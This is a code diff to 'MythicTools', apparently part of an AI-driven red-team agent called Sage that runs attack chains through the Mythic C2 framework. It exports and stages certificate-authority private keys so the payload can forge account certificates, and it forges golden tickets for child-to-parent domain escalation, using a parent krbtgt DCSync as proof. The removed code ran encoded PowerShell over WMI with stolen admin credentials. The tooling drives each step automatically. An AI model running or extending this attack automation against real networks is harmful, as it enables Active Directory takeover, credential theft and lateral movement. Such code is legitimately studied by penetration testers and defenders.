+        if not assembly_name and isinstance(parameters, str) and "sharphound" in parameters.casefold():
+            assembly_name = parameters.casefold()
+        if "sharphound" not in assembly_name:
+            return parameters
+        is_str = isinstance(parameters, str)
+        p = parameters
+        if is_str:
+            s = parameters.strip()
+            try:
+                p = json.loads(s) if s.startswith("{") else None
+            except Exception:
+                p = None
+        if isinstance(p, dict):
+            p = dict(p)
+            key_by_name = {str(k).casefold(): k for k in p.keys()}
+            for key in ("assembly_arguments", "arguments", "args", "argument", "commandline"):
+                existing_key = key_by_name.get(key)
+                if existing_key is None:
+                    continue
+                value = p.get(existing_key)
+                if not isinstance(value, str):
+                    continue
+                normalized = normalize_sharphound_arguments(value)
+                if normalized != value:
+                    p[existing_key] = normalized
+                    logger.info("🧭 [sharphound-args] normalized invalid short flag -> long form")
+                    return json.dumps(p) if is_str else p
+                return parameters
+            return parameters
+        if isinstance(parameters, str):
+            normalized = normalize_sharphound_arguments(parameters)
+            if normalized != parameters:
+                logger.info("🧭 [sharphound-args] normalized invalid short flag -> long form")
+                return normalized
+        return parameters
+
     @staticmethod
     def _rewrite_shell_like_run(command, parameters):
         normalized_command = _normalize_command_name(command)
@@ -3644,6 +4138,35 @@ class MythicTools:
         except ImportError:
             import capabilities as _caps
         return _caps.artifact_secret(prefix, slug)
+
+    def _persist_adcs_ca_export_artifact(self, output: str, target_host: str, target_domain: str) -> dict[str, str]:
+        """Persist raw CA PFX output before the durable probe drops its base64 bytes."""
+        if not target_host or not target_domain:
+            return {}
+        try:
+            from . import adcs_certificate_materializer
+        except ImportError:
+            import adcs_certificate_materializer
+        try:
+            return adcs_certificate_materializer.persist_verified_ca_pfx_artifact(
+                output,
+                Path(_engagement_state_dir()) / "artifacts",
+                engagement_key=self._eng_key(),
+                ca_host=target_host,
+                domain=target_domain,
+            )
+        except Exception:
+            return {}
+
+    @staticmethod
+    def _adcs_ca_export_artifact_evidence(probe: dict | None) -> dict[str, str]:
+        if not isinstance(probe, dict):
+            return {}
+        return {
+            key: str(probe[key])
+            for key in ("pfx_artifact_path", "pfx_artifact_sha256")
+            if probe.get(key)
+        }
 
     def _extract_domain_admin_membership_probe(self, output, expected_domain=None) -> dict:
         text = str(output or "")
@@ -4046,6 +4569,7 @@ class MythicTools:
                     proof_marker,
                 ))
                 probe["callback_id"] = self._capability_text(callback_display_id)
+                probe.update(self._persist_adcs_ca_export_artifact(output, target_host, target_domain))
                 verification = capabilities.verify_capability(capability, probe)
                 if verification.verdict != "achieved":
                     return
@@ -4059,16 +4583,18 @@ class MythicTools:
                     reason=self._capability_text(action_data.get("reason")),
                     source_facts=self._capability_list(action_data.get("source_facts")),
                 )
+                evidence = {
+                    "source": "deterministic_capability_command",
+                    "provenance": "run",
+                    "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                    "callback_id": callback_display_id,
+                    "command": self._capability_text(command),
+                }
+                evidence.update(self._adcs_ca_export_artifact_evidence(probe))
                 self.record_capability_result(
                     action,
                     probe,
-                    evidence={
-                        "source": "deterministic_capability_command",
-                        "provenance": "run",
-                        "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
-                        "callback_id": callback_display_id,
-                        "command": self._capability_text(command),
-                    },
+                    evidence=evidence,
                 )
                 return
             if capability == "adcs-esc-certificate-enroll":
@@ -4582,8 +5108,9 @@ class MythicTools:
         inputs: Annotated[dict | str | None, (
             "Runtime values for the capability. For service-access proof pass proof_host or proof_resource "
             "when BloodHound cannot resolve a domain controller. For adcs-certificate-auth Sage first probes "
-            "the current callback context, then materializes a forged account PFX only if needed, builds the "
-            "adapter command plan, executes it in order, and records only after verifier proof."
+            "the current callback context, then stages verified CA PFX material only if needed, builds the "
+            "adapter command plan so the payload performs the forge, executes it in order, and records only "
+            "after verifier proof."
         )] = None,
     ) -> str:
         """Execute one deterministic generic capability action, verify it, and record only proven effects.
@@ -4794,17 +5321,31 @@ class MythicTools:
                 }, action_obj, input_values, callback_id, issued=all_issued, build_payload=build_payload)
 
             transaction = self._capability_transaction_start(action_obj, build_payload)
+            # The current-context preflight heuristic only legitimately applies to the REDUNDANT LEADING probe
+            # steps (inventory + access-check) that the separate preflight already ran. It is position-agnostic,
+            # so it also matches core post-forge steps that touch the current Kerberos context (the referral
+            # ticket-import, purge, and post-import inventory). Skipping those would drop the referral import and
+            # collapse the cross-domain chain. Only skip preflight-looking steps until the first core action is
+            # issued; never skip a step that follows a non-preflight command.
+            # Same-forest child->parent forge: once the parent-EA referral is imported below, grant the parent
+            # DS-Replication right so this chain's own proof DCSync is not pre-blocked. Empty unless cross-domain.
+            forge_cross_domain_parent = self._cross_domain_forge_parent(action_obj, input_values)
+            core_action_issued = False
             for command_obj in list(build_payload.get("commands") or []):
+                is_current_context_preflight = self._capability_executor_is_current_context_preflight(command_obj)
                 refresh_current_context = (
                     self._capability_input_bool(input_values, "refresh_current_context")
                     or self._capability_input_bool(getattr(action_obj, "intent", {}), "refresh_current_context")
                 )
-                if (
-                    preflight.get("ran")
-                    and not refresh_current_context
-                    and self._capability_executor_is_current_context_preflight(command_obj)
+                if self._capability_executor_should_skip_leading_preflight(
+                    is_current_context_preflight,
+                    preflight_ran=bool(preflight.get("ran")),
+                    refresh_current_context=bool(refresh_current_context),
+                    core_action_issued=core_action_issued,
                 ):
                     continue
+                if not is_current_context_preflight:
+                    core_action_issued = True
                 unresolved = self._capability_executor_unresolved_placeholders(command_obj)
                 if unresolved:
                     return self._capability_executor_failure_json({
@@ -4825,6 +5366,20 @@ class MythicTools:
                     timeout,
                 )
                 all_issued.append(issued_item)
+                if (
+                    forge_cross_domain_parent
+                    and "kerberos_ticket_imported" in (command_obj.get("produces") or [])
+                    and not self._capability_executor_task_failed(issued_item)
+                    and forge_cross_domain_parent not in self._cross_domain_replication_rights
+                ):
+                    self._cross_domain_replication_rights.add(forge_cross_domain_parent)
+                    try:
+                        logger.info(
+                            "🔑 cross-domain replication-rights GRANTED for %s (parent-EA referral imported)",
+                            forge_cross_domain_parent,
+                        )
+                    except Exception:
+                        pass
                 output = self._capability_text(issued_item.get("_output"))
                 self._capability_transaction_update_artifact(transaction, command_obj, output, capabilities)
                 if self._capability_transaction_is_blocked(transaction):
@@ -4900,6 +5455,7 @@ class MythicTools:
                                 "callback_id": callback_id,
                                 "command": issued_item.get("command"),
                             }
+                            evidence.update(self._adcs_ca_export_artifact_evidence(probe))
                             if credential_refs:
                                 evidence["credential_material_imported"] = True
                                 evidence["credential_store_refs"] = credential_refs
@@ -5000,6 +5556,7 @@ class MythicTools:
                                         "callback_id": callback_id,
                                         "command": retry_item.get("command"),
                                     }
+                                    evidence.update(self._adcs_ca_export_artifact_evidence(retry_probe))
                                     if credential_refs:
                                         evidence["credential_material_imported"] = True
                                         evidence["credential_store_refs"] = credential_refs
@@ -5160,17 +5717,17 @@ class MythicTools:
         )],
         inputs: Annotated[dict | str | None, (
             "Optional runtime values. For adcs-certificate-auth include callback_id/domain/account/ca_host "
-            "when not already in the action. Optional overrides: ca_pfx_password, forged_pfx_password, "
-            "forged_pfx_path, upload_command, upload_file_param, upload_path_param, timeout."
+            "when not already in the action. Optional overrides: ca_pfx_password, remote_ca_pfx_path, "
+            "forged_pfx_password, forged_pfx_path, upload_command, upload_file_param, upload_path_param, timeout."
         )] = None,
     ) -> str:
         """Prepare runtime artifacts for a generic capability and return builder-ready inputs.
 
         This tool may issue staging tasks. For `adcs-certificate-auth`, Sage resolves a verified
-        `adcs-ca-private-key:<ca>@<domain>` artifact from the durable ledger, locally forges a
-        Windows PKINIT/smartcard-style account PFX, registers only that forged PFX in Mythic, uploads it
-        to the selected callback, and returns inputs for `build_capability_commands` with
-        `certificate_already_forged=true`. The CA signing key/PFX is never staged to the callback.
+        `adcs-ca-private-key:<ca>@<domain>` PFX artifact from the durable ledger, registers that
+        verified CA PFX in Mythic, uploads it to the selected callback, and returns inputs for
+        `build_capability_commands`. The payload adapter must perform the target-account certificate
+        forge through Mythic tasking; Sage never forges the account certificate locally.
         """
         try:
             if self.client is None:
@@ -5244,6 +5801,11 @@ class MythicTools:
                 or input_values.get("new_cert_path")
                 or input_values.get("certificate_path")
             )
+            remote_ca_path = self._capability_text(
+                input_values.get("remote_ca_pfx_path")
+                or input_values.get("staged_ca_pfx_path")
+                or input_values.get("remote_ca_cert_path")
+            )
             account_sid = self._capability_text(
                 input_values.get("account_sid")
                 or input_values.get("target_sid")
@@ -5271,6 +5833,7 @@ class MythicTools:
                 sid_extension_encoding=sid_extension_encoding,
                 ca_pfx_password=ca_password,
                 forged_pfx_password=forged_password,
+                remote_ca_pfx_path=remote_ca_path,
                 remote_forged_pfx_path=remote_path,
             )
             if not materialized.ok:
@@ -5281,16 +5844,16 @@ class MythicTools:
                     "action": asdict(action_obj) if is_dataclass(action_obj) else {},
                 }, sort_keys=True)
 
-            local_path = Path(str(materialized.inputs.get("_local_forged_pfx_path") or ""))
+            local_path = Path(str(materialized.inputs.get("_local_ca_pfx_path") or ""))
             if not local_path.is_file():
                 return json.dumps({
                     "ok": False,
-                    "missing": ["local_forged_pfx_path"],
-                    "reason": "materializer did not produce a local forged PFX",
+                    "missing": ["local_ca_pfx_path"],
+                    "reason": "materializer did not resolve a local CA PFX for staging",
                 }, sort_keys=True)
 
-            # NOT _register_file_dedup: the forged PFX is a per-engagement secret artifact — content-hash
-            # dedup could bind this op to a foreign operation's file. Hash-dedup is for static tool binaries only.
+            # NOT _register_file_dedup: the CA PFX is an engagement secret artifact. Content-hash dedup could bind
+            # this operation to another engagement's file; hash-dedup is for static tool binaries only.
             file_uuid = await mythic.register_file(self.client, filename=local_path.name, contents=local_path.read_bytes())
             upload_command = self._capability_text(input_values.get("upload_command") or "upload")
             file_param = self._capability_text(input_values.get("upload_file_param") or "File") or "File"
@@ -5299,11 +5862,11 @@ class MythicTools:
             if upload_parameters:
                 upload_parameters = dict(upload_parameters)
                 upload_parameters.setdefault(file_param, file_uuid)
-                upload_parameters.setdefault(path_param, materialized.inputs["forged_pfx_path"])
+                upload_parameters.setdefault(path_param, materialized.inputs["ca_pfx_path"])
             else:
                 upload_parameters = {
                     file_param: file_uuid,
-                    path_param: materialized.inputs["forged_pfx_path"],
+                    path_param: materialized.inputs["ca_pfx_path"],
                 }
             timeout_value = input_values.get("timeout")
             try:
@@ -5339,7 +5902,7 @@ class MythicTools:
                 "evidence": evidence,
                 "staged": {
                     "mythic_file_uuid": file_uuid,
-                    "remote_path": materialized.inputs["forged_pfx_path"],
+                    "remote_path": materialized.inputs["ca_pfx_path"],
                     "callback_id": callback_id,
                     "upload_task_id": self._last_issued_task_display_id,
                 },
@@ -5357,8 +5920,6 @@ class MythicTools:
         out = {}
         for key, value in inputs.items():
             if str(key).startswith("_"):
-                continue
-            if key in {"ca_pfx_password", "ca_cert_password", "ca_certificate_password"}:
                 continue
             out[key] = value
         return out
@@ -6156,6 +6717,7 @@ class MythicTools:
                 proof_marker,
             ))
             probe["callback_id"] = self._capability_text(callback_id)
+            probe.update(self._persist_adcs_ca_export_artifact(output, target_host, target_domain))
             verification = capabilities_mod.verify_capability(capability, probe)
             return probe, verification
         if capability == "adcs-esc-certificate-enroll":
@@ -6179,6 +6741,30 @@ class MythicTools:
             verification = capabilities_mod.verify_capability(capability, probe)
             return probe, verification
         if capability in {"forge-golden-ticket", "ensure-kerberos-context", "ensure-account-kerberos-context"}:
+            if capability == "forge-golden-ticket" and expected_probe == "extract_dcsync_secret_probe":
+                # Cross-domain (child->parent) proof. After importing the inter-realm referral ticket, a DCSync
+                # that replicates the PARENT krbtgt secret proves domain-admin-equivalent control of the parent
+                # domain. The ticket/service-access probes never recognized this, so a perfect DCSync scored
+                # "failed — no forged ticket evidence". Map a parent-krbtgt dump to domain_admin, scoped to the
+                # target (parent) domain via a boundary match so a CHILD-domain dump (whose name CONTAINS the
+                # parent label, e.g. child.root.example.local) cannot satisfy a parent proof.
+                target_domain = self._capability_text(
+                    self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
+                ).casefold()
+                probe = dict(capabilities_mod.extract_dcsync_secret_probe(output))
+                probe["callback_id"] = self._capability_text(callback_id)
+                if target_domain:
+                    probe["domain"] = target_domain
+                krbtgt_dumped = bool(probe.get("krbtgt_hash_present") or probe.get("domain_hashes_dumped"))
+                parent_in_output = bool(target_domain) and _re_mod.search(
+                    r"(?<![\w.])" + _re_mod.escape(target_domain),
+                    self._capability_text(output).casefold(),
+                ) is not None
+                if krbtgt_dumped and parent_in_output:
+                    probe["domain_admin"] = True
+                    self._log_dcsync_proof_fire(target_domain, len(self._capability_text(output)))
+                verification = capabilities_mod.verify_capability(capability, probe)
+                return probe, verification
             if expected_probe not in {
                 "extract_ticket_probe",
                 "extract_account_ticket_probe",
@@ -6523,6 +7109,26 @@ class MythicTools:
                 return reason
         return self._capability_text(fallback)
 
+    def _capability_executor_should_skip_leading_preflight(
+        self,
+        is_current_context_preflight: bool,
+        *,
+        preflight_ran: bool,
+        refresh_current_context: bool,
+        core_action_issued: bool,
+    ) -> bool:
+        # Skip a current-context-preflight step ONLY while it is still a redundant LEADING probe: a separate
+        # preflight already ran, we are not refreshing context, and no core action has issued yet. Post-forge
+        # steps (the referral ticket-import, purge, post-import inventory) can match the preflight heuristic but
+        # MUST run — gating on core_action_issued keeps them from being dropped. See the loop in
+        # execute_capability for why this matters (a dropped referral-import collapsed the cross-domain chain).
+        return (
+            preflight_ran
+            and not refresh_current_context
+            and not core_action_issued
+            and is_current_context_preflight
+        )
+
     def _capability_executor_is_current_context_preflight(self, command_obj: dict) -> bool:
         produces = {
             self._capability_text(item).casefold()
@@ -6578,6 +7184,9 @@ class MythicTools:
             "extract_local_admin_access_probe",
             "extract_managed_local_admin_secret_probe",
             "extract_remote_execution_probe",
+            # Cross-domain forge proves the parent boundary with a parent-krbtgt DCSync, not a service-access
+            # probe; this is the achieving step of that plan.
+            "extract_dcsync_secret_probe",
         }
         return bool(expected_probe) and (
             expected_probe in final_probe_names
@@ -6800,7 +7409,7 @@ class MythicTools:
             or inputs.get("auth_method")
         ).casefold() in {"schannel", "schannel-ldap", "ldap-schannel", "ldaps", "certificate-ldap"}:
             return None
-        if not self._capability_executor_pkinit_not_supported(output):
+        if not self._capability_executor_pkinit_fallback_eligible(output):
             return None
 
         fallback_inputs = dict(inputs)
@@ -6819,12 +7428,16 @@ class MythicTools:
             or fallback_inputs.get("dc")
         )
         if not explicit_ldap_server:
-            dc_host = await self._resolve_domain_controller_host(domain)
-            ldap_server = dc_host or domain
+            pkinit_dc = self._capability_executor_pkinit_domain_controller(output)
+            dc_host = "" if pkinit_dc else await self._resolve_domain_controller_host(domain)
+            ldap_server = pkinit_dc or dc_host or domain
             if ldap_server:
                 fallback_inputs["ldap_server"] = ldap_server
                 fallback_inputs["domain_controller"] = ldap_server
-                source = "BloodHound Domain Controllers membership" if dc_host else "target domain DNS name"
+                if pkinit_dc:
+                    source = "PKINIT KDC response"
+                else:
+                    source = "BloodHound Domain Controllers membership" if dc_host else "target domain DNS name"
                 fallback_inputs["domain_controller_source"] = f"{source} for {domain}"
 
         fallback_payload = await self._capability_build_command_payload(action, fallback_inputs)
@@ -6845,7 +7458,6 @@ class MythicTools:
 
         fallback_transaction = self._capability_transaction_start(action, fallback_payload)
         accumulated_probe: dict = {}
-        last_fallback_output = ""
         for fallback_command in list(fallback_payload.get("commands") or []):
             unresolved = self._capability_executor_unresolved_placeholders(fallback_command)
             if unresolved:
@@ -6870,10 +7482,9 @@ class MythicTools:
                 timeout,
             )
             fallback_item["fallback"] = "schannel-ldap"
-            fallback_item["fallback_reason"] = "PKINIT returned KDC_ERR_PADATA_TYPE_NOSUPP"
+            fallback_item["fallback_reason"] = "PKINIT returned an explicit certificate-auth compatibility error"
             all_issued.append(fallback_item)
             fallback_output = self._capability_text(fallback_item.get("_output"))
-            last_fallback_output = fallback_output
             self._capability_transaction_update_artifact(
                 fallback_transaction,
                 fallback_command,
@@ -6936,22 +7547,6 @@ class MythicTools:
             if self._capability_executor_task_failed(fallback_item):
                 break
 
-        remote_fallback = await self._capability_executor_try_remote_schannel_fallback(
-            action,
-            fallback_inputs,
-            callback_id,
-            timeout,
-            capabilities_mod,
-            before_effects,
-            all_issued,
-            materialized_payload,
-            prior_transaction,
-            fallback_transaction,
-            last_fallback_output,
-        )
-        if remote_fallback is not None:
-            return remote_fallback
-
         return self._capability_executor_failure_json({
             "ok": False,
             "verdict": "blocked" if self._capability_transaction_is_blocked(fallback_transaction) else "failed",
@@ -6971,252 +7566,23 @@ class MythicTools:
         }, action, fallback_inputs, callback_id, issued=all_issued, build_payload=fallback_payload,
             record_failed=True, failure_probe=accumulated_probe or {})
 
-    async def _capability_executor_try_remote_schannel_fallback(
-        self,
-        action,
-        inputs: dict,
-        callback_id: int,
-        timeout: int | None,
-        capabilities_mod,
-        before_effects: set[str],
-        all_issued: list[dict],
-        materialized_payload: dict | None,
-        prior_transaction: dict,
-        local_schannel_transaction: dict,
-        direct_failure_output: str,
-    ) -> str | None:
-        if self._capability_input_bool(inputs, "_remote_schannel_fallback_attempted"):
-            return None
-        if not self._capability_executor_ldap_unavailable(direct_failure_output):
-            return None
-
-        domain = (
-            self._capability_target_domain(action, inputs)
-            or self._capability_domain(action, inputs)
-            or self._capability_account_domain(action, inputs)
+    @staticmethod
+    def _capability_executor_pkinit_domain_controller(output: str) -> str:
+        match = re.search(
+            r"Using\s+domain\s+controller:\s*([A-Za-z0-9_.-]+)(?::\d+)?",
+            str(output or ""),
+            flags=re.IGNORECASE,
         )
-        account = self._capability_account(action, inputs) or "administrator"
-        target_host = self._capability_text(
-            inputs.get("ca_host")
-            or getattr(action, "intent", {}).get("ca_host")
-            or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
-        )
-        target_host_short = self._capability_host_short(target_host)
-        target_domain = self._capability_text(domain).casefold()
-        if not target_host_short or not target_domain:
-            return None
+        return match.group(1) if match else ""
 
-        achieved = self._capability_achieved_effects()
-        local_admin_effect = f"local-admin:{target_host_short}@{target_domain}"
-        remote_exec_effect = f"remote-exec:{target_host_short}@{target_domain}"
-        if remote_exec_effect not in achieved or (
-            local_admin_effect not in achieved
-            and f"admin:{target_host_short}" not in achieved
-            and f"system-or-admin:{target_host_short}" not in achieved
-        ):
-            return None
-
-        credential = await self._select_managed_local_admin_credential(target_host_short, target_domain, "Administrator")
-        if not credential:
-            return None
-        password = self._capability_text(credential.get("credential"))
-        local_account = self._capability_text(credential.get("account") or "Administrator")
-        if not password:
-            return None
-
-        pfx_path = self._capability_text(
-            inputs.get("forged_pfx_path")
-            or inputs.get("forged_certificate_path")
-            or inputs.get("certificate_path")
-        )
-        pfx_password = self._capability_text(
-            inputs.get("forged_pfx_password")
-            or inputs.get("forged_certificate_password")
-            or inputs.get("certificate_password")
-        )
-        evidence = materialized_payload.get("evidence") if isinstance(materialized_payload, dict) else {}
-        local_pfx_path = self._capability_text(
-            (evidence or {}).get("forged_pfx_artifact_path")
-            or (evidence or {}).get("local_forged_pfx_path")
-            or inputs.get("_local_forged_pfx_path")
-        )
-        if not pfx_path or not pfx_password or not local_pfx_path:
-            return None
-        pfx_file = Path(local_pfx_path)
-        if not pfx_file.is_file():
-            return None
-
-        try:
-            try:
-                from . import mythic_capability_adapter
-            except ImportError:
-                import mythic_capability_adapter
-            dc = (
-                self._capability_text(inputs.get("ldap_server") or inputs.get("domain_controller") or inputs.get("dc"))
-                or await self._resolve_domain_controller_host(domain)
-                or domain
-            )
-            search_base = self._capability_text(inputs.get("search_base") or inputs.get("base_dn"))
-            if not search_base:
-                search_base = ",".join(f"DC={part}" for part in str(domain or "").split(".") if part)
-            slug = self._capability_slug("_".join(
-                self._capability_text(part)
-                for part in (account, domain, callback_id, target_host_short)
-                if self._capability_text(part)
-            ))
-            proof_marker = self._capability_text(inputs.get("proof_marker") or f"SAGE_CERT_AUTH_PROOF_{slug}")
-            output_path = self._capability_text(
-                inputs.get("remote_schannel_output_path")
-                or inputs.get("remote_output_path")
-                or f"C:\\Windows\\Temp\\sage_cert_auth_{slug}.txt"
-            )
-            pfx_b64 = base64.b64encode(pfx_file.read_bytes()).decode("ascii")
-            schannel = mythic_capability_adapter._certificate_schannel_ldap_powershell(
-                domain=domain,
-                account=account,
-                certificate_path=pfx_path,
-                certificate_password=pfx_password,
-                domain_controller=dc,
-                search_base=search_base,
-                proof_marker=proof_marker,
-            )
-            ps_quote = mythic_capability_adapter._ps_quote
-            if "$lines|Write-Output" in schannel:
-                schannel = schannel.rsplit("$lines|Write-Output", 1)[0]
-            schannel = schannel.replace(
-                "$lines|Write-Output;return",
-                "throw 'CERT_AUTH_REMOTE_LDAP_BIND_FAILED'",
-            )
-            remote_script = ";".join([
-                "$ErrorActionPreference='Continue'",
-                f"$certBytes=[Convert]::FromBase64String('{pfx_b64}')",
-                f"[IO.File]::WriteAllBytes({ps_quote(pfx_path)},$certBytes)",
-                schannel,
-                f"$lines|Set-Content -Encoding ASCII -Path {ps_quote(output_path)}",
-                "$lines|Write-Output",
-            ])
-            encoded = base64.b64encode(remote_script.encode("utf-16le")).decode("ascii")
-            remote_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + encoded
-        except Exception:
-            return None
-
-        host = self._capability_host_name(target_host_short, target_domain)
-        realm = self._capability_text(credential.get("realm") or target_host_short)
-        if "." in realm:
-            realm = target_host_short
-        output_unc = self._capability_unc_from_windows_path(host, output_path)
-        remote_transaction = {
-            "capability": self._capability_text(getattr(action, "name", "")),
-            "target": self._capability_text(getattr(action, "target", "")),
-            "required_effects": list(getattr(action, "effects", []) or []),
-            "artifact_obligations": [],
-            "delayed_effect_obligations": [],
-            "proof_obligations": ["extract_adcs_certificate_auth_probe"],
-            "validated_artifacts": [],
-            "events": [],
-        }
-        commands = [
-            {
-                "command": "wmiexecute",
-                "parameters": {
-                    "command": remote_command,
-                    "host": host,
-                    "username": local_account,
-                    "password": password,
-                    "domain": realm,
-                },
-                "purpose": f"run Schannel certificate-auth proof from {target_host_short}@{target_domain}",
-                "expected_probe": "",
-                "produces": ["remote_process_created"],
-                "consumes": ["forged_certificate_pfx", remote_exec_effect, local_admin_effect],
-            },
-            {
-                "command": "cat",
-                "parameters": {"path": output_unc},
-                "purpose": f"read remote Schannel certificate-auth proof from {output_unc}",
-                "expected_probe": "extract_adcs_certificate_auth_probe",
-                "produces": ["certificate_schannel_ldap_probe"],
-                "consumes": ["remote_process_created"],
-            },
-        ]
-
-        accumulated_probe: dict = {}
-        for index, command_obj in enumerate(commands):
-            item = await self._execute_capability_command(command_obj, callback_id, timeout)
-            item["fallback"] = "remote-schannel-ldap"
-            item["fallback_reason"] = "direct Schannel LDAP was unavailable from the current callback"
-            all_issued.append(item)
-            output = self._capability_text(item.get("_output"))
-            if index == 0 and self._capability_executor_task_failed(item):
-                remote_transaction["status"] = "command_failed"
-                remote_transaction["pin_reason"] = item.get("failure_reason") or "remote Schannel command failed"
-                break
-            probe, verification = self._capability_executor_verify_output(
-                action,
-                inputs,
-                callback_id,
-                output,
-                command_obj,
-                capabilities_mod,
-            )
-            if verification is None:
-                continue
-            if probe:
-                accumulated_probe = self._capability_executor_merge_probe(accumulated_probe, probe)
-                verification = capabilities_mod.verify_capability(
-                    self._capability_text(getattr(action, "name", "")),
-                    accumulated_probe,
-                )
-                probe = dict(accumulated_probe)
-            item["verify_verdict"] = verification.verdict
-            item["verify_reason"] = verification.reason
-            self._capability_transaction_update_verification(remote_transaction, command_obj, verification)
-            if verification.verdict == "achieved":
-                if not self._capability_action_effects_achieved(action):
-                    self.record_capability_result(
-                        action,
-                        probe or accumulated_probe or {},
-                        evidence={
-                            "source": "execute_capability",
-                            "provenance": "run",
-                            "mythic_task_id": item.get("task_id"),
-                            "callback_id": callback_id,
-                            "command": item.get("command"),
-                            "fallback": "remote-schannel-ldap",
-                            "remote_host": host,
-                        },
-                    )
-                after_effects = self._capability_achieved_effects()
-                return json.dumps({
-                    "ok": True,
-                    "verdict": "achieved",
-                    "capability": self._capability_text(getattr(action, "name", "")),
-                    "reason": verification.reason,
-                    "action": asdict(action) if is_dataclass(action) else {},
-                    "materialized": self._capability_executor_materialized_summary(materialized_payload),
-                    "issued": self._capability_executor_public_issued(all_issued),
-                    "recorded_effects": sorted(after_effects - before_effects),
-                    "achieved_effects": sorted(after_effects),
-                    "stopped_after": "remote_schannel_ldap_fallback_verified_proof",
-                    "pkinit_transaction": prior_transaction,
-                    "local_schannel_transaction": local_schannel_transaction,
-                    "transaction": remote_transaction,
-                    "fallback": "remote-schannel-ldap",
-                }, sort_keys=True)
-            if self._capability_executor_task_failed(item):
-                break
-        return None
-
-    def _capability_executor_ldap_unavailable(self, output: str) -> bool:
-        low = self._capability_text(output).casefold()
-        return "ldap server is unavailable" in low or "cert_auth_inner_error=the ldap server is unavailable" in low
-
-    def _capability_executor_pkinit_not_supported(self, output: str) -> bool:
+    def _capability_executor_pkinit_fallback_eligible(self, output: str) -> bool:
         low = self._capability_text(output).casefold()
         return (
             "kdc_err_padata_type_nosupp" in low
             or "padata type nosupp" in low
             or "krb-error (16)" in low
+            or "kdc_err_client_not_trusted" in low
+            or "krb-error (62)" in low
         )
 
     def _capability_executor_unresolved_placeholders(self, command_obj: dict) -> set[str]:
@@ -7309,11 +7675,43 @@ class MythicTools:
         for hop in list(getattr(self, "_engagement_hops", []) or []):
             if self._capability_text(getattr(hop, "status", "")).casefold() not in {"failed", "blocked"}:
                 continue
+            evidence = getattr(hop, "evidence", {})
+            if isinstance(evidence, dict) and evidence.get("terminal_failure") is False:
+                continue
             for effect in list(getattr(hop, "satisfied_effects", []) or []) or [getattr(hop, "effect", "")]:
                 text = self._capability_text(effect)
                 if text:
                     effects.add(self._canonical_capability_effect(text))
         return effects
+
+    def _capability_executor_failure_class(
+        self,
+        payload: dict,
+        issued: list[dict] | None,
+    ) -> str:
+        issued_rows = [item for item in list(issued or []) if isinstance(item, dict)]
+        last = issued_rows[-1] if issued_rows else {}
+        result_class = self._capability_text(last.get("result_class")).casefold()
+        if result_class in {"construction", "genuine", "transient"}:
+            return result_class
+        reason = self._capability_text(payload.get("reason") if isinstance(payload, dict) else "")
+        output = self._capability_text(last.get("_output"))
+        return self._capability_text(
+            command_builder.classify_result(
+                self._capability_text(last.get("command")),
+                output or reason,
+            )
+        ).casefold()
+
+    def _capability_executor_failure_is_terminal(
+        self,
+        payload: dict,
+        issued: list[dict] | None,
+    ) -> bool:
+        return self._capability_executor_failure_class(payload, issued) not in {
+            "construction",
+            "transient",
+        }
 
     def _capability_executor_record_failed_attempt(
         self,
@@ -7341,6 +7739,10 @@ class MythicTools:
         preview = reason
         if last.get("_output"):
             preview = self._capability_executor_output_preview(last.get("_output"), limit=700)
+        failure_class = self._capability_executor_failure_class(payload, issued_rows)
+        terminal_failure = self._capability_executor_failure_is_terminal(payload, issued_rows)
+        payload["failure_class"] = failure_class
+        payload["retryable_failure"] = not terminal_failure
         probe = dict(failure_probe or {}) if isinstance(failure_probe, dict) else {}
         if callback_id is not None and not self._capability_text(
             probe.get("callback_id") or probe.get("callback") or probe.get("callback_display_id")
@@ -7349,7 +7751,9 @@ class MythicTools:
         evidence = {
             "source": "execute_capability",
             "provenance": "run",
-            "terminal_failure": True,
+            "terminal_failure": terminal_failure,
+            "failure_class": failure_class,
+            "retryable_failure": not terminal_failure,
             "callback_id": self._capability_text(callback_id),
             "mythic_task_id": last.get("task_id"),
             "command": last.get("command"),
@@ -8192,15 +8596,26 @@ class MythicTools:
                 remote_exec_effect = f"remote-exec:{self._capability_text(target_host).casefold()}@{self._capability_text(target_domain).casefold()}"
                 if remote_exec_effect in self._capability_achieved_effects():
                     inputs.setdefault("adcs_ca_export_use_current_context", False)
-                    inputs.setdefault(
-                        "adcs_ca_export_command",
-                        inputs.get("adcs_ca_remote_exec_command")
-                        or inputs.get("local_admin_remote_exec_command")
-                        or inputs.get("remote_exec_command")
-                        or inputs.get("adcs_ca_orchestration_command")
-                        or inputs.get("local_powershell_command")
-                        or "wmiexecute",
-                    )
+                    if not self._capability_text(inputs.get("adcs_ca_export_command")):
+                        requested_export_command = self._capability_text(
+                            inputs.get("adcs_ca_remote_exec_command")
+                            or inputs.get("local_admin_remote_exec_command")
+                            or inputs.get("remote_exec_command")
+                            or inputs.get("adcs_ca_orchestration_command")
+                            or inputs.get("local_powershell_command")
+                        )
+                        if requested_export_command:
+                            inputs["adcs_ca_export_command"] = requested_export_command
+                        else:
+                            payload_type = ""
+                            if callback_id:
+                                try:
+                                    payload_type = self._capability_text(
+                                        await self._resolve_payload_type(int(callback_id))
+                                    ).casefold()
+                                except Exception:
+                                    payload_type = ""
+                            inputs["adcs_ca_export_command"] = "powerpick" if payload_type == "apollo" else "wmiexecute"
                 else:
                     inputs.setdefault("adcs_ca_export_use_current_context", True)
                     inputs.setdefault("current_context_powershell_command", "powerpick")
@@ -8395,6 +8810,23 @@ class MythicTools:
                 self._remove_capability_input_error(inputs, "invalid_enterprise_admins_sid")
                 self._remove_capability_input_error(inputs, "invalid_extra_sids")
                 self._normalize_capability_ticket_inputs(inputs)
+
+        # Cross-domain child->parent forge needs TWO domain controllers: the parent DC (already resolved as
+        # proof_host on the effect domain, below) is where the access proof runs, and the CHILD DC is where the
+        # inter-realm referral hop must be presented. Resolve the child DC here so the execution plan can target
+        # it. Range-agnostic: the child DC is the DC of the source (child) domain.
+        if (
+            capability == "forge-golden-ticket"
+            and target_domain
+            and target_domain != domain
+            and not self._capability_text(inputs.get("child_dc") or inputs.get("source_dc"))
+        ):
+            child_dc = self._capability_host_name(
+                await self._resolve_domain_controller_host(domain), domain
+            )
+            if child_dc:
+                inputs["child_dc"] = child_dc
